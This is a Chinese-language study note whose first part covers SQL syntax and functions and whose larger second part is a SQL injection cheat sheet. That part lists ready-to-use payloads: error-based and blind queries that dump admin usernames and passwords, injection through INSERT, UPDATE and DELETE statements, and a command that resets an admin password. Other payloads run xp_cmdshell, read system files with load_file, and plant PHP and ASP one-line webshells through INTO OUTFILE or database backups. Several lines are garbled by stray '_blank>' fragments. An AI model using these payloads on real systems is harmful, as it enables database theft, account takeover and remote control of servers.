#sql基础
---
##sql基础语法
###注释
1. MySQL注释
	- 从‘#’字符从行尾,常用%23替代。
	
	- 从‘-- 123’序列到行尾。请注意‘-- ’(双破折号)注释风格要求第2个破折号后面至少跟一个空格符(例如空格、tab、换行符等等)。该语法与标准SQL注释语法稍有不同，后者将在1.8.5.7, “‘--’作为注释起始标记”中讨论。
	
			注意：
			之所以要求使用空格，是为了防止与自动生成SQL查询有关的问题，它采用了类似下面的代码，其中，自动为“!payment!”插入“payment”的值：
				UPDATE account SET credit=credit-!payment!
			考虑一下，如果“payment”的值为负数如“-1”时会出现什么情况：
				UPDATE account SET credit=credit--1
			在SQL中“credit--1”是合法的表达式，但是，如果“--1”被解释为注释开始，部分表达式将被舍弃。其结果是，表达式的意义与预期的意义完全不同。
				UPDATE account SET credit=credit
			该语句不会对值作任何更改！这表明，允许注释以“--”开始会产生严重后果。

	- 从\*序列到后面的*\序列。结束序列不一定在同一行中，因此该语法允许注释跨越多行。
	
			注意：
			/*!50001 DROP TABLE IF EXISTS `count_yysbh`*/;		内联注释，50001表示当数据库版本是5.00.01以上版本时，“DROP TABLE IF EXISTS `count_yysbh”才会被执行

2. MSSQL
3. ACCESS
4. ORCALE

##常用SQL查询语句

###简单查询语句
1. 查看表结构  
	SQL>DESC emp;

2. 查询所有列  
	SQL>SELECT * FROM emp;

3. 查询指定列  
	SQL>SELECT empmo, ename, mgr FROM emp;

SQL>SELECT DISTINCT mgr FROM emp; 只显示结果不同的项

4. 查询指定行

SQL>SELECT * FROM emp WHERE job='CLERK';

5. 使用算术表达式

SQL>SELECT ename, sal*13+nvl(comm,0)  FROM emp; 

nvl(comm,1)的意思是，如果comm中有值，则nvl(comm,1)=comm; comm中无值，则nvl(comm,1)=0。

SQL>SELECT ename, sal*13+nvl(comm,0) year_sal FROM emp; （year_sal为别名，可按别名排序）

SQL>SELECT * FROM emp WHERE hiredate>'01-1月-82';

6. 使用like操作符（%，_）

%表示一个或多个字符，_表示一个字符，[charlist]表示字符列中的任何单一字符，[^charlist]或者[!charlist]不在字符列中的任何单一字符。

SQL>SELECT * FROM emp WHERE ename like 'S__T%';

7. 在where条件中使用In

SQL>SELECT * FROM emp WHERE job IN ('CLERK','ANALYST');

8. 查询字段内容为空/非空的语句

SQL>SELECT * FROM emp WHERE mgr IS/IS NOT NULL; 

9. 使用逻辑操作符号

SQL>SELECT * FROM emp WHERE (sal>500 or job='MANAGE') and ename like 'J%';

10. 将查询结果按字段的值进行排序

SQL>SELECT * FROM emp ORDER BY deptno, sal DESC; (按部门升序，并按薪酬降序)

11.基本增删改查
creat
insert
delete
update
select

###复杂查询

1. 数据分组(max,min,avg,sum,count)

SQL>SELECT MAX(sal),MIN(age),AVG(sal),SUM(sal) from emp;

SQL>SELECT * FROM emp where sal=(SELECT MAX(sal) from emp));

SQL>SELEC COUNT(*) FROM emp;

2. group by（用于对查询结果的分组统计） 和 having子句（用于限制分组显示结果）

SQL>SELECT deptno,MAX(sal),AVG(sal) FROM emp GROUP BY deptno;

SQL>SELECT deptno, job, AVG(sal),MIN(sal) FROM emp group by deptno,job having AVG(sal)<2000;

对于数据分组的总结：

a. 分组函数只能出现在选择列表、having、order by子句中（不能出现在where中）

b. 如果select语句中同时包含有group by, having, order by，那么它们的顺序是group by, having, order by。

c. 在选择列中如果有列、表达式和分组函数，那么这些列和表达式必须出现在group by子句中，否则就是会出错。

使用group by不是使用having的前提条件。

3. 多表查询

SQL>SELECT e.name,e.sal,d.dname FROM emp e, dept d WHERE e.deptno=d.deptno order by d.deptno;

SQL>SELECT e.ename,e.sal,s.grade FROM emp e,salgrade s WHER e.sal BETWEEN s.losal AND s.hisal;

4. 自连接（指同一张表的连接查询）

SQL>SELECT er.ename, ee.ename mgr_name from emp er, emp ee where er.mgr=ee.empno;

5. 子查询（嵌入到其他sql语句中的select语句，也叫嵌套查询）

5.1 单行子查询

SQL>SELECT ename FROM emp WHERE deptno=(SELECT deptno FROM emp where ename='SMITH');查询表中与smith同部门的人员名字。因为返回结果只有一行，所以用“=”连接子查询语句

5.2 多行子查询

SQL>SELECT ename,job,sal,deptno from emp WHERE job IN (SELECT DISTINCT job FROM emp WHERE deptno=10);查询表中与部门号为10的工作相同的员工的姓名、工作、薪水、部门号。因为返回结果有多行，所以用“IN”连接子查询语句。

in与exists的区别： exists() 后面的子查询被称做相关子查询，它是不返回列表的值的。只是返回一个ture或false的结果，其运行方式是先运行主查询一次，再去子查询里查询与其对 应的结果。如果是ture则输出，反之则不输出。再根据主查询中的每一行去子查询里去查询。in()后面的子查询，是返回结果集的，换句话说执行次序和 exists()不一样。子查询先产生结果集，然后主查询再去结果集里去找符合要求的字段列表去。符合要求的输出，反之则不输出。

5.3 使用ALL

SQL>SELECT ename,sal,deptno FROM emp WHERE sal> ALL (SELECT sal FROM emp WHERE deptno=30);或SQL>SELECT ename,sal,deptno FROM emp WHERE sal> (SELECT MAX(sal) FROM emp WHERE deptno=30);查询工资比部门号为30号的所有员工工资都高的员工的姓名、薪水和部门号。以上两个语句在功能上是一样的，但执行效率上，函数会高 得多。

5.4 使用ANY

SQL>SELECT ename,sal,deptno FROM emp WHERE sal> ANY (SELECT sal FROM emp WHERE deptno=30);或SQL>SELECT ename,sal,deptno FROM emp WHERE sal> (SELECT MIN(sal) FROM emp WHERE deptno=30);查询工资比部门号为30号的任意一个员工工资高（只要比某一员工工资高即可）的员工的姓名、薪水和部门号。以上两个语句在功能上是 一样的，但执行效率上，函数会高得多。

5.5 多列子查询

SQL>SELECT * FROM emp WHERE (job, deptno)=(SELECT job, deptno FROM emp WHERE ename='SMITH');

5.6 在from子句中使用子查询

 SQL>SELECT emp.deptno,emp.ename,emp.sal,t_avgsal.avgsal FROM emp,(SELECT emp.deptno,avg(emp.sal) avgsal FROM emp GROUP BY emp.deptno) t_avgsal where emp.deptno=t_avgsal.deptno AND emp.sal>t_avgsal.avgsal ORDER BY emp.deptno;

5.7 分页查询

数据库的每行数据都有一个对应的行号，称为rownum.

SQL>SELECT a2.* FROM (SELECT a1.*, ROWNUM rn FROM (SELECT * FROM emp ORDER BY sal) a1 WHERE ROWNUM<=10) a2 WHERE rn>=6;

指定查询列、查询结果排序等，都只需要修改最里层的子查询即可。

5.8 用查询结果创建新表

SQL>CREATE TABLE mytable (id,name,sal,job,deptno) AS SELECT empno,ename,sal,job,deptno FROM emp;

5.9 合并查询（union 并集, intersect 交集, union all 并集+交集, minus差集)

SQL>SELECT ename, sal, job FROM emp WHERE sal>2500 UNION(INTERSECT/UNION ALL/MINUS) SELECT ename, sal, job FROM emp WHERE job='MANAGER';

合并查询的执行效率远高于and,or等逻辑查询。

 5.10 使用子查询插入数据

SQL>CREATE TABLE myEmp(empID number(4), name varchar2(20), sal number(6), job varchar2(10), dept number(2)); 先建一张空表；

SQL>INSERT INTO myEmp(empID, name, sal, job, dept) SELECT empno, ename, sal, job, deptno FROM emp WHERE deptno=10; 再将emp表中部门号为10的数据插入到新表myEmp中，实现数据的批量查询。

5.11 使用了查询更新表中的数据

SQL>UPDATE emp SET(job, sal, comm)=(SELECT job, sal, comm FROM emp where ename='SMITH') WHERE ename='SCOTT';
5.12 拼接查询concat
	1>CONCAT拼接字符串
		SELECT CONCAT('HELLO', ' WORLD') AS expr
		GROUP_CONCAT可以和GROUP BY语句一起用
		SELECT GROUP_CONCAT(name) AS names FROM xxx
    2>SELECT GROUP_CONCAT(name) AS names FROM xxx GROUP BY yy
		将符合条件的同一列中的不同行数据拼接, 以逗号分隔
		names返回的是blob类型, 在java中需要特殊处理, 否则出错：
			No Dialect mapping for JDBC type:
		或者将其转化为varchar类型
	3>SELECT TRIM(GROUP_CONCAT(name)) AS names FROM xxx

###特殊查询

(一)CONCAT（）
CONCAT（）函数用于将多个字符串连接成一个字符串。
使用数据表Info作为示例，其中SELECT id,name FROM info LIMIT 1;的返回结果为
+----+--------+
| id | name   |
+----+--------+
|  1 | BioCyc |
+----+--------+
1、语法及使用特点：
CONCAT(str1,str2,…)                       
返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。

2、使用示例：
SELECT CONCAT(id, ‘，’, name) AS con FROM info LIMIT 1;返回结果为
+----------+
| con      |
+----------+
| 1,BioCyc |
+----------+

SELECT CONCAT(‘My’, NULL, ‘QL’);返回结果为
+--------------------------+
| CONCAT('My', NULL, 'QL') |
+--------------------------+
| NULL                     |
+--------------------------+

3、如何指定参数之间的分隔符
使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)
CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。

如SELECT CONCAT_WS('_',id,name) AS con_ws FROM info LIMIT 1;返回结果为
+----------+
| con_ws   |
+----------+
| 1_BioCyc |
+----------+

SELECT CONCAT_WS(',','First name',NULL,'Last Name');返回结果为
+----------------------------------------------+
| CONCAT_WS(',','First name',NULL,'Last Name') |
+----------------------------------------------+
| First name,Last Name                         |
+----------------------------------------------+

4、GROUP_CONCAT（）函数
GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。
使用表info作为示例，其中语句SELECT locus,id,journal FROM info WHERE locus IN('AB086827','AF040764');的返回结果为
+----------+----+--------------------------+
| locus    | id | journal                  |
+----------+----+--------------------------+
| AB086827 |  1 | Unpublished              |
| AB086827 |  2 | Submitted (20-JUN-2002)  |
| AF040764 | 23 | Unpublished              |
| AF040764 | 24 | Submitted (31-DEC-1997)  |
+----------+----+--------------------------+

1>使用语法及特点：
GROUP_CONCAT([DISTINCT] expr [,expr ...]
[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]]
[SEPARATOR str_val])
在 MySQL 中，你可以得到表达式结合体的连结值。通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。
SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (",")，可以通过指定 SEPARATOR "" 完全地移除这个分隔符。
可以通过变量 group_concat_max_len 设置一个最大的长度。在运行时执行的句法如下： SET [SESSION | GLOBAL] group_concat_max_len = unsigned_integer;
如果最大长度被设置，结果值被剪切到这个最大长度。如果分组的字符过长，可以对系统参数进行设置：SET @@global.group_concat_max_len=40000;

2>使用示例：
语句 SELECT locus,GROUP_CONCAT(id) FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus; 的返回结果为
+----------+------------------+
| locus    | GROUP_CONCAT(id) |
+----------+------------------+
| AB086827 | 1,2              |
| AF040764 | 23,24            |
+----------+------------------+

语句 SELECT locus,GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;的返回结果为
+----------+----------------------------------------------------------+
| locus    | GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') |
+----------+----------------------------------------------------------+
| AB086827 | 2_1                                                      |
| AF040764 | 24_23                                                    |
+----------+----------------------------------------------------------+

语句SELECT locus,GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;的返回结果为
+----------+--------------------------------------------------------------------------+
| locus    | GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') |
+----------+--------------------------------------------------------------------------+
| AB086827 | 2, Submitted (20-JUN-2002). 1, Unpublished                               |
| AF040764 | 24, Submitted (31-DEC-1997) . 23, Unpublished                            |
+----------+--------------------------------------------------------------------------+

###sql函数
{
substring
	SUBSTRING(str,pos)
	SUBSTRING(str FROM pos)
	SUBSTRING(str,pos,len)
	SUBSTRING(str FROM pos FOR len)	
ord(char)函数返回字符串第一个字符的 ASCII 值。
ASCII(str)返回最左边的字符的字符串str的数值。如果str是空字符串，返回0。如果str为NULL，返回NULL。 ASCII()是从0到255的数值的字符。
database()
version()
user()
sleep()
concat()
case when


1.mid()函数

mid(striing,start,length)

string(必需)规定要返回其中一部分的字符串。

start(必需)规定开始位置（起始值是 1）。

length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。


2.substr()函数

substr(string,start,length)

string(必需)规定要返回其中一部分的字符串。

start(必需)规定在字符串的何处开始。

length(可选)规定被返回字符串的长度。


3.left()函数

left(string,length)

再怎么解释也不如直接开弄

string(必需)规定要返回其中一部分的字符串

length（可选）规定被返回字符串的前length长度的字符
}
}

#sql注入
---
##注入常见类型及思路
###数字型注入

###字符型注入

###GET型注入

###宽字节注入

###POST注入

###cookie注入

###代理注入

###搜索型注入

###登录框注入
sql约束攻击
万能密码
程序逻辑错误
	sql赋值绕过登录
	MD5漏洞


###error-based（爆错型）
1. 通过floor暴错

		/*数据库版本*/
		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*简单办法暴库*/
		id=info()
		/*连接用户*/
		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*连接数据库*/
		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*暴库*/
		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*暴表*/
		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*暴字段*/
		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		/*暴内容*/
		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
		
2. ExtractValue(有长度限制,最长32位)

		and extractvalue(1, concat(0x7e, (select @@version),0x7e))
		or extractvalue(1,concat(0x7e,database())) or
		and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
		
3. UpdateXml(有长度限制,最长32位)

		and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
		and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
		
4. NAME_CONST(适用于低版本)

		and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--

5. rand()

		
6. Error based Double Query Injection 

		(http://www.vaibs.in/error-based-double-query-injection/)
		/*数据库版本*/
		or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 

	
###http头注入

1. http头注入之X-Forwarded-For
2. http头注入Client-IP
3. http头注入之x-remote-IP
4. http头注入之x-originating-IP
5. http头注入之x-remote-addr

###盲注
1. 盲注之基于时间延迟sleep/benchmark
		select 1 from te where if(1=1,sleep(1),1) limit 0,1;
		' or sleep(ord(substr(password,1,1))) --
		select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));
2. 盲注之基于boolean
		select 123 from dual where 1=1
		select 123 from dual where 1=0;
		http://192.168.1.1/1.php?id=1' and length(database())=8 %23
		http://192.168.1.1/1.php?id=1' and left(database(),1)<'t' %23
		http://192.168.1.1/1.php?id=1' and ascii(substr(select(database()),2,1))>100%23
		select 1 from te order by if(1,1,(select 1 union select 2)) limit 0,3;
		select 1 from te order by if(0,1,(select 1 union select 2)) limit 0,3;
		IF(expr1,expr2,expr3),expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果
3. 盲注之errorbased
		select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
		select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)		
		select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
		select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));
		select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1));  
		其他数据库：
			PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- 
			MSSQL: /?param=1 and(1)=convert(int,@@version)-- 
			Sybase: /?param=1 and(1)=convert(int,@@version)-- 
			Oracle >=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select 
			replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
				
	算法：字频统计
		二分查找，位运算法
###二次注入

###按查询语句分类注入
	insert注入
		报错注入：
			insert into test.user (id,user,pwd) values (10,’user’,'pass’ and 1=(updatexml(1,concat(0x5e24,(select password from mysql.user limit 1),0x5e24),1)));
			INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo');
			
			insert into user (user,password) values(‘inject’,'xss’ and extractvalue(1, concat(0x5c,(select password from mysql.user limit 1))));
			INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,database())) or'', 'Nervo');
			
			INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,		0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or'', 'Nervo');
			
			insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);

		延时注入
			insert into test.user (id,user,pwd) values (11,’user’,'pass’ and (select if(mid(user(),1,1)=’r',sleep(5),0)));
	updata注入
		UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or'' WHERE id=2 and username='Olivia';
		UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or'' WHERE id=2 and username='Nervo';
		UPDATE users SET password='Nicky' or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.		tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' WHERE id=2 and username='Nervo';
		
		select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
	union注入
		union select
	delete注入
		DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';
		DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or'';
		DELETE FROM users WHERE id=1 or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables 		limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' ;
	
	提取数据payload
		INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or'', 'Nervo');
		
		INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 1,1))) or'', 'Nervo');
		
		INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '','Nervo');
		
		INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');
		
		INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT concat(0x7e,0x27,cast(users.username as char),0x27,0x7e) FROM `newdb`.users LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');
		
	闭合变种
		' or (payload) or '
		' and (payload) and '
		' or (payload) and '
		' or (payload) and '='
		'* (payload) *'
		' or (payload) and '
		" – (payload) – "
		' and '1'='1
		' and 1=1%23
		' and 1=1-- aaaa
		' and 1=1#
	
	参考文章
		http://dev.mysql.com/
		http://websec.ca/kb/sql_injection
		from：http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf
	
针对不同数据库的注入技术总结
mysql
	limit 1
mssql
	top 1
oracle
access
mongodb

注入应用思路
	注入搜集信息
	注入获取数据
	注入读取文件
	注入写入文件（webshell）
	注入直接拿os-shell


常用手工注入语句
{
	
	判断注入点：
整形参数判断
    1、直接加'  2、and 1=1  3、 and 1=2
    如果1、3运行异常 2正常就存在注入
字符型判断
    1、直接加'  2、and '1'='1'  3、 and '1'='2'
搜索型： 关键字%' and 1=1 and '%'='%  
        关键字%' and 1=2 and '%'='%
    如果1、3运行异常 2正常就存在注入 
	
	order by 3
	select @@version,database(),user()


	union select table_name from information_schema.tables where table_schema=database()
	union select column_name from information_schema.columns where table_name=$tablename
	union select $column from $tablename
	
	获取数据库版本
		and (select @@version)>0
	获取当前数据库名
		and db_name()>0
	获取当前数据库用户名
		and user>0
		and user_name()='dbo'
		
	猜解所有数据库名称
		and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0
	猜解表的字段名称
		and (Select Top 1 col_name(object_id('表名'),1) from sysobjects)>0
		and (select top 1 asernaose from admin where id =1)>1
		.asp?id=xx having 1=1  其中admin.id就是一个表名admin 一个列名id
		.asp?id=xx group by admin.id having 1=1 可以得到列名
		.asp?id=xx group by admin.id,admin.username having 1=1 得到另一个列名 页面要和表有联系
	
	如果知道了表名和字段名就可以爆出准确的值
	union select 1,2,username,password,5,6,7,8,9,10,11,12 from usertable where id=6
	
	爆账号
		union select min(username),1,1,1，.. from users where username > 'a'
	依次循环爆其余的账号
		union select min(username),1,1,1,.. from users where username > 'admin'
		;begin declare @ret varchar(8000) set @ret=':' select @ret=@ret+' '+username+'/'+password from userstable where username>@ret select @ret as ret into foo end
	修改管理员的密码为123
		.asp?id=××;update admin set password='123' where id =1
		.asp?id=××;insert into admin(asd,..) values(123,..) –就能能往admin中写入123了
	rebots.txt
	
	猜解数据库中用户名表的名称
		and (select count(*) from 数据库.dbo.表名)>0
	若表名存在，则工作正常，否则异常
		得到用户名表的名称，基本的实现方法是
		1：
		and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 )>0 或
		and (Select Top 1 name from sysobjects where xtype=’U’ and status>0)>0
		  但在异常中却可以发现表的名称。假设发现的表名是xyz，则
		2：
		and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'，'..'..))>0
		  可以得到第二个用户建立的表的名称，同理就可得到所有用建立的  表的名称
		3:
		and (select top l name from (select top [N]id,name from bysobjects where  xtype=char(85)) T order  by  id  desc)＞1 Ｎ为数据库中地N个表
		利用系统表区分数据库类型
		and (select count(*) from  sysobjects)>0
		and (select count(*) from msysobjects)>0
		若是SQL-SERVE则第一条,ACCESS则两条都会异常
		判断是否有比较高的权限
		and 1=(select is_srvrolemember('sysadmin'))
		and 1=(select is_srvrolemember('serveradmin'))
		判断当前数据库用户名是否为db_owner:
		and 1=(select is_member('db_owner'))
		xp_cmdshell
		:exec master..xp_cmdshell '要执行的cmd命令'
		判断长度
		and (select top 1 len(字段) from 表名)>5
		爆料出正确值
		and (select top 1 asc(substring(字段,1,1)) from 表名)>0
	差异备份
		//备份数据库到某处
			;backup database 数据库名 to disk ='c:\\charlog.bak';--
		//创建名为datachar的表
			;create table [dbo].[datachar] ([cmd] [image])    	//cmd为列名 image 数据类型
		//插入值,为一句话木马的16进制形式：<%execute(request("a"))%>
			;insert into datachar(cmd)values(0x3C25657865637574652872657175657374282261222929253E)—
		//进行差异备份,把不同的信息备份到某处
			;backup database 数据库名 to disk='目录' WITH DIFFERENTIAL,FORMAT;-- 
			
	读写文件：
		select 1,load_file('c:/boot.ini'),3,4 from ka_admin
		select '<?php eval($_POST[cmd])?>' into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php' 
		select * from a into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'
		注意事项：
			（1）outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成\',那么基本没的玩了。
				唯一的一种可能就是你使用mysql远程连接，然后直接在mysql中执行命令，就没有查询限制了。当然，你要是找到了phpmyadmin，也可以。
			（2）load_file，后面的路径可以是单引号、0x、char转换的字符。这而记得路径中的斜杠是/而不是\。
				一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。
			（3）load_file可以在union中作为一个字段来用。如union select 1,load_file('c:/boot.ini'),3,4 from ka_admin等。
			（4）load_file可以在where字句中使用。如 and length(load_file(0x633A2F626F6F742E696E69))>1
			（5）load_file文件的时候，特别是想看exe等含有二进制的00等截断或者回车 换行等特殊符号时，可以结合hex函数。
			如union select 1,hex(load_file('c:/windows/notepad.exe')),3 from xxxx，这样就不会存在截断了，也不会一会断行而截断。自己再用个工具或者几行代码转换回来就是了。
			（6）outfile一句话（经典）：
			select '<?php eval($_POST[cmd])?>' into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'或者从表中
			select * from a into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'
			 （7）关于mysql多语句：直接在mysql中，可以同时select中使用update或者insert，但是php注入中就不行，至少我测试的是php的函数mysql_query是不行。
					
	load_file()、 into outfile() 、informaction_schema、char()、cast()和limit
	
	{1.判断有无注入点
	; and 1=1 and 1=2
	
	2.猜表一般的表的名称无非是admin adminuser user pass password 等..
	and 0<>(select count(*) from *)
	and 0<>(select count(*) from admin) ---判断是否存在admin这张表
	
	3.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个
	and 0<(select count(*) from admin)
	and 1<(select count(*) from admin)
	
	4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.
	and 1=(select count(*) from admin where len(*)>0)--
	and 1=(select count(*) from admin where len(用户字段名称name)>0)
	and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)
	
	5.猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止
	and 1=(select count(*) from admin where len(*)>0)
	and 1=(select count(*) from admin where len(name)>6) 错误
	and 1=(select count(*) from admin where len(name)>5) 正确 长度是6
	and 1=(select count(*) from admin where len(name)=6) 正确
	
	and 1=(select count(*) from admin where len(password)>11) 正确
	and 1=(select count(*) from admin where len(password)>12) 错误 长度是12
	and 1=(select count(*) from admin where len(password)=12) 正确
	
	6.猜解字符
	and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位
	and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位
	就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了
	and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --
	这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的 ASSIC码就OK.最后把结果再转换成字符.
	
	group by users.id having 1=1--
	group by users.id, users.username, users.password, users.privs having 1=1--
	; insert into users values( 666, attacker, foobar, 0xffff )--
	
	UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable-
	UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable Where COLUMN_blank>_NAME NOT IN (login_blank>_id)-
	UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable Where COLUMN_blank>_NAME NOT IN (login_blank>_id,login_blank>_name)-
	UNION Select TOP 1 login_blank>_name FROM logintable-
	UNION Select TOP 1 password FROM logintable where login_blank>_name=Rahul--
	
	看_blank>服务器打的补丁=出错了打了SP4补丁
	and 1=(select @@VERSION)--
	
	看_blank>数据库连接账号的权限，返回正常，证明是 _blank>服务器角色sysadmin权限。
	and 1=(Select IS_blank>_SRVROLEMEMBER(sysadmin))--
	
	判断连接_blank>数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）
	and sa=(Select System_blank>_user)--
	and user_blank>_name()=dbo--
	and 0<>(select user_blank>_name()--
	
	看xp_blank>_cmdshell是否删除
	and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = X AND name = xp_blank>_cmdshell)--
	
	xp_blank>_cmdshell被删除，恢复,支持绝对路径的恢复
	;EXEC master.dbo.sp_blank>_addextendedproc xp_blank>_cmdshell,xplog70.dll--
